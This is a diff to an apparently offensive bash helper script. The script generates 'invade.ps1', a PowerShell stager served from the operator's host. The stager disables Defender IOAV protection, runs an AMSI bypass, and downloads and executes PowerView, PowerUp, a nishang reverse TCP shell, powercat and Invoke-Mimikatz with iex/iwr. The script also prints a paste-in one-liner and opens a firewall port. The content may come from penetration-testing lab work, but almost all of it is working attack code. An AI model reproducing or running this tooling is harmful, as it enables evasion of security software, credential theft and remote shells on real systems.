@@ -81,29 +81,92 @@ done
 [[ $# -eq 1 ]] || usage 1
 
 ip="$1"
+url="http://$ip:$port"
 
 if [[ -n $(command -v git) ]] && [[ -n $update ]]; then
     git submodule update --init --recursive
 fi
 
+# Save some variables for convenience
+dllname="Microsoft.ActiveDirectory.Management.dll"
+dll="C:\\Windows\\Temp\\$dllname"
+hide="-ErrorAction SilentlyContinue -WarningAction SilentlyContinue"
+iex="iex $hide"
+iwr="iwr $hide -UseBasicParsing"
+languagemode="\$ExecutionContext.SessionState.LanguageMode"
+
 # Setup invade.ps1
 cat >invade.ps1 <<EOF
-iwr -OutFile C:\\Windows\\Temp\\Microsoft.ActiveDirectory.Management.dll -UseBasicParsing http://$ip:$port/ADModule/Microsoft.ActiveDirectory.Management.dll
-Import-Module C:\\Windows\\Temp\\Microsoft.ActiveDirectory.Management.dll
+# ADModule
+$iwr -OutFile $dll $url/ADModule/$dllname
+if (!\$?) {echo "Failed to fetch ADModule"}
+Import-Module $hide $dll
+if (\$?) {
+    echo "Imported ADModule"
+} else {
+    echo "Failed to import ADModule"
+}
 
-iex (iwr -UseBasicParsing http://$ip:$port/amsi_bypass.ps1)
-iex (iwr -UseBasicParsing http://$ip:$port/PowerSploit/Recon/PowerView.ps1)
-iex (iwr -UseBasicParsing http://$ip:$port/PowerSploit/Privesc/PowerUp.ps1)
+if (!($languagemode -match "constrained")) {
+    # Disable defender
+    Set-MpPreference $hide -DisableIOAVProtection \$true
+    if (\$?) {
+        echo "Disabled IOAVProtection"
+    } else {
+        echo "Failed to disable IOAVProtection, elevated shell?"
+    }
 
-iex (iwr -UseBasicParsing http://$ip:$port/nishang/Shells/Invoke-PowerShellTcp.ps1)
-iex (iwr -UseBasicParsing http://$ip:$port/powercat/powercat.ps1)
+    # AMSI bypass
+    $iex ($iwr $url/amsi_bypass.ps1)
+    if (\$?) {
+        echo "Bypassed AMSI"
+    } else {
+        echo "Failed to bypass AMSI"
+    }
 
-Set-MpPreference -DisableIOAVProtection \$true -ErrorAction Ignore
-iex (iwr -UseBasicParsing http://$ip:$port/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1)
+    # PowerView and PowerUp
+    $iex ($iwr $url/PowerSploit/Recon/PowerView.ps1)
+    if (\$?) {
+        echo "Imported PowerView"
+    } else {
+        echo "Failed to import PowerView"
+    }
+    $iex ($iwr $url/PowerSploit/Privesc/PowerUp.ps1)
+    if (\$?) {
+        echo "Imported PowerUp"
+    } else {
+        echo "Failed to import PowerUp"
+    }
+
+    # Reverse shell goodies
+    $iex ($iwr $url/nishang/Shells/Invoke-PowerShellTcp.ps1)
+    if (\$?) {
+        echo "Imported PowerShellTcp"
+    } else {
+        echo "Failed to import PowerShellTcp"
+    }
+    $iex ($iwr $url/powercat/powercat.ps1)
+    if (\$?) {
+        echo "Imported PowerCat"
+    } else {
+        echo "Failed to import PowerCat"
+    }
+
+    # Mimikatz
+    $iex ($iwr $url/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1)
+    if (!\$?) {echo "Failed to import Mimikatz"}
+    if (\$?) {
+        echo "Imported Mimikatz"
+    } else {
+        echo "Failed to import Mimikatz"
+    }
+} else {
+    echo "You're in a constrained shell"
+}
 EOF
 
 # Let user know what to type
-info "iex (iwr -UseBasicParsing http://$ip:$port/invade.ps1)"
+info "iex (iwr -UseBasicParsing $url/invade.ps1)"
 
 # Open firewall
 sudo iptables -I INPUT -p tcp -d "$ip" --dport "$port" -j ACCEPT
